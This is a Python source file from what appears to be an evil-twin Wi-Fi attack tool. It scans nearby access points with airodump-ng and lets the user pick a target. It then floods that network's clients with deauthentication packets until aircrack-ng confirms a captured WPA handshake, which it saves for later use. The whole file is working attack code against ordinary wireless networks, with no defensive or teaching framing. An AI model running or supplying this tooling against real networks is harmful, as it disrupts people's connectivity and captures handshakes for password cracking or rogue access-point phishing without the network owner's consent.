import os
import shutil
from time import sleep
from subprocess import call
from threading import Thread
from lib.interface import Interface
from lib.deauth import Deauthenticate
from commands import getoutput as shell
from lib.accesspoints import Accesspoints
from lib.settings import (COLORS, SCAN_OUPUT, SCAN_INTERFACE, EVIL_TWIN_OUTPUT,
                          DEAUTH_INTERFACE, EVIL_TWIN_INTERFACE, WORKING_PATH)

class Discover(object):
 ''' Display nearby accesspoints '''

 def __init__(self, iface):

  # accesspoints object
  self.accesspoints = Accesspoints()

  # set into monitor mode
  Interface().create_iface(iface, SCAN_INTERFACE)

 def airodump(self):
  shell('airodump-ng -a -w {} --output-format csv {}'.\
  format(SCAN_OUPUT, SCAN_INTERFACE))

 def scan(self):
  ''' scan for accesspoints '''

  # start accesspoints display thread
  self.accesspoints.is_alive = True
  Thread(target=self.accesspoints.start).start()

  # start airodump thread
  Thread(target=self.airodump).start()

  # wait for CTRL-C
  while self.accesspoints.is_alive:
   try:sleep(1)
   except KeyboardInterrupt:
    self.accesspoints.is_alive = False
  else:
   sleep(0.5)
   shell('pkill airodump-ng')
   os.remove(self.accesspoints.csv_file)

 def run(self):

  # scan AP's
  self.scan()

  # give each ap an ID
  aps = {}
  for _, ap in enumerate(self.accesspoints.mem):
   aps[_] = self.accesspoints.aps[ap]

  # did the scan work
  if not aps:return

  # user input
  while 1:
   try:
    self.accesspoints.display()
    prompt = raw_input('\n[-] Enter a {}num{}ber: '.format(COLORS['yellow'], COLORS['white']))
    if not prompt.isdigit():continue
    if int(prompt) in aps:break
   except:return

  # accesspoint's details
  return aps[int(prompt)]

class Monitor(object):
 ''' Monitor an accesspoint for clients, then send death packets '''

 def __init__(self, iface, ap):
  self.is_alive = True
  self.handshake = False

  self.bssid = ap['bssid']
  self.chann = ap['chann']

  self.handshake_file = SCAN_OUPUT + '-01.cap'
  self.accesspoint = Accesspoints(ap['essid'])
  self.handshake_path = WORKING_PATH + '/' + ap['bssid']
  self.deauth = Deauthenticate(DEAUTH_INTERFACE, ap['bssid'])

  Interface().create_iface(iface, DEAUTH_INTERFACE)
  self._handshake_file = '{}/handshake.cap'.format(self.handshake_path)

 def airodump(self):
  shell('airodump-ng -a --bssid {} -c {} -w {} --output-format cap,csv {}'.\
  format(self.bssid, self.chann, SCAN_OUPUT, SCAN_INTERFACE))

 def check_handshake(self):
  if 'WPA (1 handshake)' in shell('aircrack-ng {}-01.cap'.format(SCAN_OUPUT)):
   self.handshake = True

 def attack(self):
  while all([self.is_alive, not self.handshake]):
   if not self.bssid in self.accesspoint.aps:continue
   if not self.accesspoint.aps[self.bssid]['client']:continue

   if any([not self.is_alive, self.handshake]):break
   [map(self.deauth.send_pkts, range(256)) for _ in range(3)]

   for _ in range(15):
    if any([not self.is_alive, self.handshake]):break
    self.check_handshake()
    sleep(0.5)

 def scan(self):

  # ask to reuse a saved handshake
  if os.path.exists(self._handshake_file):
   try:
    call(['clear'])
    prompt = raw_input('[-] {}Handshake{}: {}\n[-] Would you like to use a previously captured handshake? [Y/n] '.\
     format(COLORS['blue'], COLORS['white'], self._handshake_file)).lower().strip()

    if prompt == 'y':
     self.handshake = True
     return self.handshake_path, self._handshake_file
   except KeyboardInterrupt:return
   except:pass

  # start accesspoint display thread
  self.accesspoint.is_alive = True
  Thread(target=self.accesspoint.start).start()

  # start airodump thread
  Thread(target=self.airodump).start()

  # start deauthentication thread
  Thread(target=self.attack).start()

  # wait for CTRL-C and a handshake
  while all([self.is_alive, not self.handshake]):
   try:sleep(1)
   except KeyboardInterrupt:
    self.is_alive = False
  else:
   sleep(0.5)
   shell('pkill airodump-ng')
   os.remove(self.accesspoint.csv_file)
   self.accesspoint.is_alive = False

  # save handshake
  if self.handshake:

   # configure the path
   if not os.path.exists(self.handshake_path):
    os.mkdir(self.handshake_path)
   else:
    shutil.rmtree(self.handshake_path)
    os.mkdir(self.handshake_path)

   # move the handshake
   shutil.move(self.handshake_file, self._handshake_file)
